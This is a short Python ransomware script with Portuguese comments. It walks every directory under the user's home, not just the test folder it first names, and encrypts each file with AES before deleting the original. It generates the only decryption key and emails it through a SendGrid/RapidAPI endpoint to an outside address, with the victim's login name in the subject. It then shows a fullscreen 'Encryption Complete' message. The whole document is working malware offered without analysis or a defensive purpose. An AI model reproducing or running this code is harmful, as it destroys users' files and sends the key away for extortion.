import os
import shutil
import pyAesCrypt
import secrets
import tkinter as tk
from tkinter import messagebox
from pathlib import Path
import requests

# Define a pasta para criptografia
folders_path = [
    str(os.path.join(Path.home(), "TesteRansonware"))
]

# Preenche a lista com todos os diretórios a partir do diretório do usuário
folders_path = []
for root, dirs, files in os.walk(os.path.expanduser("~")):
    for dir in dirs:
        folders_path.append(os.path.join(root, dir))

# Gera uma chave de criptografia
key = secrets.token_hex(16)

# Configura o envio da chave por e-mail
url = "https://rapidprod-sendgrid-v1.p.rapidapi.com/mail/send"
payload = {
    "personalizations": [
        {
            "to": [{"email": "pedro.gomes2@academico.ufpb.com.br"}],
            "subject": "Decryption Key for " + str(os.getlogin())
        }
    ],
    "from": {"email": "paulsaul621@gmail.com"},
    "content": [
        {
            "type": "text/plain",
            "value": str(key)
        }
    ]
}
headers = {
    "content-type": "application/json",
    "X-RapidAPI-Key": "GET YOUR OWN",
    "X-RapidAPI-Host": "rapidprod-sendgrid-v1.p.rapidapi.com"
}
response = requests.request("POST", url, json=payload, headers=headers)

# Criptografa todos os arquivos nas pastas especificadas
for folder_path in folders_path:
    for file in os.listdir(folder_path):
        bufferSize = 64 * 1024
        # Obtém o caminho do arquivo atual
        file_path = os.path.join(folder_path, file)
        if not file.endswith(".aes"):
            # Criptografa o arquivo
            pyAesCrypt.encryptFile(file_path, file_path + ".aes", key, bufferSize)
            # Move o arquivo criptografado para o destino
            destination_path = os.path.join(folder_path, "encrypted_" + file + ".aes")
            shutil.move(file_path + ".aes", destination_path)
            # Exclui o arquivo original
            os.remove(file_path)

# Exibe uma mensagem informando que a criptografia foi concluída
root = tk.Tk()
root.withdraw()
root.geometry("{}x{}".format(root.winfo_screenwidth(), root.winfo_screenheight()))
messagebox.showinfo("Encryption Complete", "All files in the folders have been encrypted.")
root.mainloop()
